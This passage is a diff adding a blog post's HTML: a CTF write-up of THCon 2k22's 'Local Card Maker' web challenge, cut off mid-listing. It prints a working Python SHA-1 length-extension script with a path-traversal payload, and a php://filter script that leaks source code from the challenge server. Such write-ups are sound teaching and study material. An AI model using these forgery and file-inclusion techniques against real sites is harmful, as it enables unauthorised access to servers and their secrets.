@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>THCon 2k22 CTF - “Local Card Maker” Writeup | Guy Lewin’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="THCon 2k22 CTF - “Local Card Maker” Writeup" />
+<meta name="author" content="Guy Lewin" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="I participated in THCon 2k22 CTF and amongst the incredible “web” challenges - my favorite was “Local Card Maker” (made by jrjgjk). In this post I’ll describe the challenge and my step-by-step solution." />
+<meta property="og:description" content="I participated in THCon 2k22 CTF and amongst the incredible “web” challenges - my favorite was “Local Card Maker” (made by jrjgjk). In this post I’ll describe the challenge and my step-by-step solution." />
+<link rel="canonical" href="https://lewin.co.il/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup.html" />
+<meta property="og:url" content="https://lewin.co.il/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup.html" />
+<meta property="og:site_name" content="Guy Lewin’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-04-17T20:55:10+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="THCon 2k22 CTF - “Local Card Maker” Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Guy Lewin"},"dateModified":"2022-04-17T20:55:10+00:00","datePublished":"2022-04-17T20:55:10+00:00","description":"I participated in THCon 2k22 CTF and amongst the incredible “web” challenges - my favorite was “Local Card Maker” (made by jrjgjk). In this post I’ll describe the challenge and my step-by-step solution.","headline":"THCon 2k22 CTF - “Local Card Maker” Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://lewin.co.il/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup.html"},"url":"https://lewin.co.il/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://lewin.co.il/feed.xml" title="Guy Lewin's Blog" />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-YEJ89F03YG"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-YEJ89F03YG');
+</script>
+<script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Guy Lewin&#39;s Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/GuyLevin"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/GuyLewin"><i class="fab fa-github-square"></i></a>
+        
+        
+        
+        <a class="color-green-hover" href="https://www.linkedin.com/in/guy-lewin-48b00712/"><i class="fab fa-linkedin"></i></a>
+        
+        
+        
+        <a class="color-indigo-hover" href="mailto:contact@lewin.co.il"><i class="fa fa-envelope-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    https://github.com/GuyLewin.png
+" class="author-avatar" alt="Avatar" />
+<div class="description">Documenting things I found useful.</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">THCon 2k22 CTF - "Local Card Maker" Writeup</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/ctf/">ctf</a>
+      
+      <a class="tag" href="/tag/exploit/">exploit</a>
+      
+      <a class="tag" href="/tag/lfi/">lfi</a>
+      
+      <a class="tag" href="/tag/php/">php</a>
+      
+      <a class="tag" href="/tag/rce/">rce</a>
+      
+      <a class="tag" href="/tag/sha-1/">sha-1</a>
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+  </div>
+  
+  <div class="post-date">
+    Published on 17 Apr 2022
+    
+    by Guy Lewin
+    
+  </div>
+  
+  <p>I participated in <a href="https://ctf.thcon.party/">THCon 2k22 CTF</a> and amongst the incredible “web” challenges - my favorite was “Local Card Maker” (made by <code class="language-plaintext highlighter-rouge">jrjgjk</code>). In this post I’ll describe the challenge and my step-by-step solution.</p>
+
+<h2 id="the-challenge">The Challenge</h2>
+
+<p><img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/1.png" alt="Description in the CTF portal" /></p>
+
+<p>Right off the bat we can tell there’s going to be some SHA-1 (<em>“secure hash algorithm 1”</em>) with a 23 character “secret key”. The attached ZIP file contained only the following <code class="language-plaintext highlighter-rouge">scan.txt</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PAGE	|	HTTP_STATUS
+
+/index.php   ==&gt; 200
+/phpinfo.php ==&gt; 200
+/change_profile.php ==&gt; 200
+/view_profile.php ==&gt; 200
+</code></pre></div></div>
+
+<p>The goal is to read the content of <code class="language-plaintext highlighter-rouge">/flag.txt</code>.</p>
+
+<h2 id="exploring-the-site">Exploring the Site</h2>
+
+<p>The site has 2 interesting pages I could find:</p>
+
+<p><img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/2.png" alt="View" />
+<img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/3.png" alt="Edit" /></p>
+
+<p>The edit page sets a cookie (<code class="language-plaintext highlighter-rouge">user_data</code>) with the PHP-serialized <code class="language-plaintext highlighter-rouge">User</code> object set in the form (along with another cookie - <code class="language-plaintext highlighter-rouge">user_hash</code> to sign that data), and the view page displays that information if the hash is valid. I tried modifying <code class="language-plaintext highlighter-rouge">user_data</code> in multiple ways but kept getting hash validation errors. I decided to put that aside and try a different direction.</p>
+
+<p>The URLs of these pages - <code class="language-plaintext highlighter-rouge">http://challenges1.thcon.party:2001/index.php?page=Y2hhbmdlX3Byb2ZpbGU=&amp;pHash=0171caa8e7a1fe56361fdce865e6e174b3b892f9</code> and <code class="language-plaintext highlighter-rouge">http://challenges1.thcon.party:2001/index.php?page=dmlld19wcm9maWxl&amp;pHash=7b6f8b016f25da478b9f28f878aa3be8cced66fd</code> - both seem to go through <code class="language-plaintext highlighter-rouge">index.php</code> for rendering. The <code class="language-plaintext highlighter-rouge">page</code> parameter is base64-encoded “change_profile” and “view_profile” which matches the files in <code class="language-plaintext highlighter-rouge">scan.txt</code>!</p>
+
+<p>When I tried to access <code class="language-plaintext highlighter-rouge">/phpinfo.php</code>, <code class="language-plaintext highlighter-rouge">/change_profile.php</code> or <code class="language-plaintext highlighter-rouge">/view_profile.php</code> directly I received an error (“Direct access to this page is disable.”).</p>
+
+<p>Theoretically - we can access <code class="language-plaintext highlighter-rouge">phpinfo.php</code> if we could put that value (Base64-encoded) in the <code class="language-plaintext highlighter-rouge">page</code> query parameter - but without finding the proper hash the validation will keep failing.</p>
+
+<h2 id="sha-1-exploitation">SHA-1 Exploitation</h2>
+
+<p>A quick Google search led me to <a href="https://journal.batard.info/post/2011/03/04/exploiting-sha-1-signed-messages">this article</a> which seemed like the perfect solution - if I have data and SHA-1 hash on it with a salt prefix (of known length) - I can append data to it and calculate a valid hash, without knowing the salt! To understand this section better - I recommend reading the article before proceeding.</p>
+
+<p>I relied heavily on <a href="https://github.com/nicolasff/pysha1">the code from the article <code class="language-plaintext highlighter-rouge">nicolasff</code> posted on GitHub</a> to create a script to fetch <code class="language-plaintext highlighter-rouge">phpinfo.php</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">struct</span>
+<span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">urllib.parse</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+<span class="c1"># The code below is based on https://github.com/nicolasff/pysha1 (adapted to Python3) until line 87:
+</span>
+<span class="n">top</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
+
+<span class="k">def</span> <span class="nf">rotl</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">lmask</span> <span class="o">=</span> <span class="n">top</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">32</span><span class="o">-</span><span class="n">n</span><span class="p">)</span>
+    <span class="n">rmask</span> <span class="o">=</span> <span class="n">top</span> <span class="o">&gt;&gt;</span> <span class="n">n</span>
+    <span class="n">l</span> <span class="o">=</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="n">lmask</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="n">rmask</span>
+    <span class="n">newl</span> <span class="o">=</span> <span class="n">r</span> <span class="o">&lt;&lt;</span> <span class="n">n</span>
+    <span class="n">newr</span> <span class="o">=</span> <span class="n">l</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">32</span><span class="o">-</span><span class="n">n</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">newl</span> <span class="o">+</span> <span class="n">newr</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="p">(</span><span class="n">ret</span> <span class="o">+</span> <span class="n">e</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">top</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="nb">xrange</span> <span class="o">=</span> <span class="nb">range</span>
+
+<span class="k">def</span> <span class="nf">sha1_impl</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">h0</span><span class="p">,</span> <span class="n">h1</span><span class="p">,</span> <span class="n">h2</span><span class="p">,</span> <span class="n">h3</span><span class="p">,</span> <span class="n">h4</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">xrange</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span> <span class="o">/</span> <span class="mi">64</span><span class="p">)):</span>
+        <span class="n">chunk</span> <span class="o">=</span> <span class="n">msg</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">64</span><span class="p">:</span> <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">64</span><span class="p">]</span>
+
+        <span class="n">w</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">xrange</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+            <span class="n">word</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
+            <span class="p">(</span><span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="p">],)</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;i</span><span class="sh">"</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">80</span><span class="p">):</span>
+            <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">rotl</span><span class="p">((</span><span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span> <span class="o">^</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span> <span class="o">^</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">14</span><span class="p">]</span> <span class="o">^</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">16</span><span class="p">])</span> <span class="o">&amp;</span> <span class="n">top</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+
+        <span class="n">a</span> <span class="o">=</span> <span class="n">h0</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="n">h1</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">h2</span>
+        <span class="n">d</span> <span class="o">=</span> <span class="n">h3</span>
+        <span class="n">e</span> <span class="o">=</span> <span class="n">h4</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">80</span><span class="p">):</span>
+            <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">19</span><span class="p">:</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="n">c</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="o">~</span> <span class="n">b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">d</span><span class="p">)</span>
+                <span class="n">k</span> <span class="o">=</span> <span class="mh">0x5A827999</span>
+            <span class="k">elif</span> <span class="mi">20</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">39</span><span class="p">:</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="n">b</span> <span class="o">^</span> <span class="n">c</span> <span class="o">^</span> <span class="n">d</span>
+                <span class="n">k</span> <span class="o">=</span> <span class="mh">0x6ED9EBA1</span>
+            <span class="k">elif</span> <span class="mi">40</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">59</span><span class="p">:</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="n">c</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="n">d</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">c</span> <span class="o">&amp;</span> <span class="n">d</span><span class="p">)</span>
+                <span class="n">k</span> <span class="o">=</span> <span class="mh">0x8F1BBCDC</span>
+            <span class="k">elif</span> <span class="mi">60</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">79</span><span class="p">:</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="n">b</span> <span class="o">^</span> <span class="n">c</span> <span class="o">^</span> <span class="n">d</span>
+                <span class="n">k</span> <span class="o">=</span> <span class="mh">0xCA62C1D6</span>
+
+            <span class="n">temp</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="nf">rotl</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span> <span class="n">f</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="p">]])</span>
+            <span class="n">e</span> <span class="o">=</span> <span class="n">d</span>
+            <span class="n">d</span> <span class="o">=</span> <span class="n">c</span>
+            <span class="n">c</span> <span class="o">=</span> <span class="nf">rotl</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span>
+            <span class="n">b</span> <span class="o">=</span> <span class="n">a</span>
+            <span class="n">a</span> <span class="o">=</span> <span class="n">temp</span>
+
+        <span class="n">h0</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="n">h0</span><span class="p">,</span> <span class="n">a</span><span class="p">])</span>
+        <span class="n">h1</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="n">h1</span><span class="p">,</span> <span class="n">b</span><span class="p">])</span>
+        <span class="n">h2</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="n">h2</span><span class="p">,</span> <span class="n">c</span><span class="p">])</span>
+        <span class="n">h3</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="n">h3</span><span class="p">,</span> <span class="n">d</span><span class="p">])</span>
+        <span class="n">h4</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="n">h4</span><span class="p">,</span> <span class="n">e</span><span class="p">])</span>
+
+    <span class="nf">return </span><span class="p">(</span><span class="n">h0</span><span class="p">,</span> <span class="n">h1</span><span class="p">,</span> <span class="n">h2</span><span class="p">,</span> <span class="n">h3</span><span class="p">,</span> <span class="n">h4</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">sz</span> <span class="o">=</span> <span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">sz</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">sz</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+    <span class="n">bits</span> <span class="o">=</span> <span class="n">sz</span> <span class="o">*</span> <span class="mi">8</span>
+    <span class="n">padding</span> <span class="o">=</span> <span class="mi">512</span> <span class="o">-</span> <span class="p">((</span><span class="n">bits</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">%</span> <span class="mi">512</span><span class="p">)</span> <span class="o">-</span> <span class="mi">64</span>
+
+    <span class="n">msg</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x80</span><span class="sh">"</span>  <span class="c1"># append bit "1", and a few zeros.
+</span>    <span class="k">return</span> <span class="n">msg</span> <span class="o">+</span> <span class="nf">int</span><span class="p">(</span><span class="n">padding</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;q</span><span class="sh">"</span><span class="p">,</span> <span class="n">bits</span><span class="p">)</span>  <span class="c1"># don't count the \x80 here, hence the -8.
+</span>
+<span class="k">def</span> <span class="nf">sha1</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+    <span class="c1"># These are the constants in a standard SHA-1
+</span>    <span class="k">return</span> <span class="nf">sha1_impl</span><span class="p">(</span><span class="nf">pad</span><span class="p">(</span><span class="n">msg</span><span class="p">),</span> <span class="mh">0x67452301</span> <span class="p">,</span> <span class="mh">0xefcdab89</span> <span class="p">,</span> <span class="mh">0x98badcfe</span> <span class="p">,</span> <span class="mh">0x10325476</span> <span class="p">,</span> <span class="mh">0xc3d2e1f0</span><span class="p">)</span>
+
+<span class="c1"># "Local Card Maker"-specific implementation starts here:
+</span>
+<span class="k">def</span> <span class="nf">sha1_bytes_to_str</span><span class="p">(</span><span class="n">result</span><span class="p">):</span>
+    <span class="k">return</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="nf">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">result</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">get_h_values</span><span class="p">(</span><span class="n">hash_string</span><span class="p">):</span>
+    <span class="c1"># Divide hash_string to 5 ints, 4 bytes each
+</span>    <span class="k">return</span> <span class="p">[</span><span class="nf">int</span><span class="p">(</span><span class="n">hash_string</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)]</span>
+
+<span class="c1"># "view_profile" taken from site ("page" query parameter)
+</span><span class="n">block_1_buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">dmlld19wcm9maWxl</span><span class="sh">"</span>
+<span class="c1"># Hash taken from site ("pHash" query parameter)
+</span><span class="n">block_1_hash</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">7b6f8b016f25da478b9f28f878aa3be8cced66fd</span><span class="sh">"</span>
+<span class="n">block_1_h_values</span> <span class="o">=</span> <span class="nf">get_h_values</span><span class="p">(</span><span class="n">block_1_hash</span><span class="p">)</span>
+<span class="c1"># taken from description of challenge
+</span><span class="n">salt_len</span> <span class="o">=</span> <span class="mi">23</span>
+
+<span class="c1"># "aaa" is padding, since the previous SHA-1 block contains the length at the end which is parsed by PHP as Base64 data.
+# I align to 4 bytes in order for the appended path to be parsed correctly.
+</span><span class="n">block_2_buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">aaa</span><span class="sh">"</span> <span class="o">+</span> <span class="n">base64</span><span class="p">.</span><span class="nf">encodebytes</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/.././././././././phpinfo</span><span class="sh">"</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">""</span><span class="p">)</span>
+<span class="c1"># Pad this second block, use a custom size with additional 64 bytes to account for the first block (which is always padded to 64)
+</span><span class="n">block_2_buf_padded</span> <span class="o">=</span> <span class="nf">pad</span><span class="p">(</span><span class="n">block_2_buf</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">block_2_buf</span><span class="p">)</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span>
+<span class="n">joined_buf_hash</span> <span class="o">=</span> <span class="nf">sha1_bytes_to_str</span><span class="p">(</span><span class="nf">sha1_impl</span><span class="p">(</span><span class="n">block_2_buf_padded</span><span class="p">,</span> <span class="o">*</span><span class="n">block_1_h_values</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">joined_buf_hash</span><span class="p">)</span>
+<span class="c1"># Add 23 "A"s to simulate the SHA-1 block creation with the salt, but remove the salt since it'll be added by the server.
+</span><span class="n">joined_buf</span> <span class="o">=</span> <span class="nf">pad</span><span class="p">((</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">salt_len</span><span class="p">)</span> <span class="o">+</span> <span class="n">block_1_buf</span><span class="p">)[</span><span class="n">salt_len</span><span class="p">:]</span> <span class="o">+</span> <span class="n">block_2_buf</span>
+<span class="n">encoded_joined_buf</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">quote_plus</span><span class="p">(</span><span class="n">joined_buf</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">encoded_joined_buf</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://challenges1.thcon.party:2001/index.php?page=%s&amp;pHash=%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">encoded_joined_buf</span><span class="p">,</span> <span class="n">joined_buf_hash</span><span class="p">)).</span><span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>In the code above we use the “view_profile” page (encoded as <code class="language-plaintext highlighter-rouge">dmlld19wcm9maWxl</code> in Base64) along with the salted hash (<code class="language-plaintext highlighter-rouge">7b6f8b016f25da478b9f28f878aa3be8cced66fd</code>) from the site URL. We pad that to a SHA-1 block (64 bytes including the salt, first byte after data is 0x80 and last 2 bytes are length) and add a 2nd block: <code class="language-plaintext highlighter-rouge">aaa + base64("/.././././././././phpinfo")</code>.</p>
+
+<p>We add 3 bytes (<code class="language-plaintext highlighter-rouge">"aaa"</code>) because the last byte of the previous SHA-1 block (as you can see below - 0x38 in yellow) is identified by PHP as a Base64 data byte. Aligning that to 4 bytes makes the following Base64-encoded string correctly readable (since Base64 is read aligned to 4 bytes).</p>
+
+<p>The result <code class="language-plaintext highlighter-rouge">joined_buf</code> which we were able to sign (before URL encoding) is:</p>
+
+<p><img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/4.png" alt="" /></p>
+
+<p>The first part (green) is the original Base64-encoded string (containing “view_profile”). The red <code class="language-plaintext highlighter-rouge">0x80</code> is the end-of-string marker added in SHA-1. Afterwards, the white <code class="language-plaintext highlighter-rouge">0x00</code> bytes are padding to complete the first chunk to 64 bytes (taking into account that 23 bytes were also used for salt and 2 bytes are used for length). The yellow <code class="language-plaintext highlighter-rouge">0x01 0x38</code> is chunk length in bits. It equals 0x138 = 312 bits = 39 bytes which is calculated by: <code class="language-plaintext highlighter-rouge">len("dmlld19wcm9maWxl") + key_length = 16 + 23 = 39</code>. The next 3 blue-colored <code class="language-plaintext highlighter-rouge">0x61</code> bytes are the padding I mentioned previously to align our Base64 string for PHP. The rest of the purple bytes are the Base64 payload.</p>
+
+<p>When PHP receives this payload with a valid hash - it parses the Base64-encoded path as: <code class="language-plaintext highlighter-rouge">view_profile&lt;unprintable characters&gt;/.././././././././phpinfo</code> - which will be resolved into <code class="language-plaintext highlighter-rouge">phpinfo</code> and appended by the app logic with <code class="language-plaintext highlighter-rouge">.php</code>. Now we got to read what’s in <code class="language-plaintext highlighter-rouge">phpinfo.php</code>!</p>
+
+<h2 id="phpinfo">phpinfo</h2>
+
+<p>If you’re unfamiliar with <a href="https://www.php.net/manual/en/function.phpinfo.php"><code class="language-plaintext highlighter-rouge">phpinfo()</code></a> - it’s a built-in function that prints useful information about PHP and the environment it’s running on. Here’s how it looks like when running from our exploited URL (<code class="language-plaintext highlighter-rouge">phpinfo.php</code> simply calls <code class="language-plaintext highlighter-rouge">phpinfo()</code>):</p>
+
+<p><img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/5.png" alt="" />
+Within this page I found a good lead - the key used as the SHA-1 salt! The key was shown here because it’s defined as a PHP variable:</p>
+
+<p><img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/6.png" alt="" />
+But this key isn’t enough to retrieve the flag from /flag.txt - we can’t load a .txt file since the <code class="language-plaintext highlighter-rouge">index.php</code> loader code appends <code class="language-plaintext highlighter-rouge">.php</code> to every Base64 payload we give it.</p>
+
+<h2 id="bonus---leaking-indexphp-file-contents">Bonus - Leaking index.php File Contents</h2>
+
+<p>I wanted to make sure I understand how <code class="language-plaintext highlighter-rouge">index.php</code> works internally, so equipped with the secret key I leaked the content of index.php:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">hashlib</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">php_file</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span>
+<span class="n">path</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">php://filter/convert.base64-encode/resource=%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">php_file</span><span class="p">,)</span>
+<span class="n">key_salt</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Thcon_SuP3r_S3cr4t_K3y!</span><span class="sh">"</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">encodebytes</span><span class="p">(</span><span class="n">path</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">""</span><span class="p">)</span>
+<span class="n">buf_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha1</span><span class="p">(</span><span class="n">key_salt</span> <span class="o">+</span> <span class="n">buf</span><span class="p">).</span><span class="nf">hexdigest</span><span class="p">()</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://challenges1.thcon.party:2001/index.php?page=%s&amp;pHash=%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">buf_hash</span><span class="p">)).</span><span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The result is Base64-encoded <code class="language-plaintext highlighter-rouge">index.php</code>. Here it is after decoding, to better understand how this challenge works:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">require</span><span class="p">(</span><span class="s2">"crypto.php"</span><span class="p">);</span>
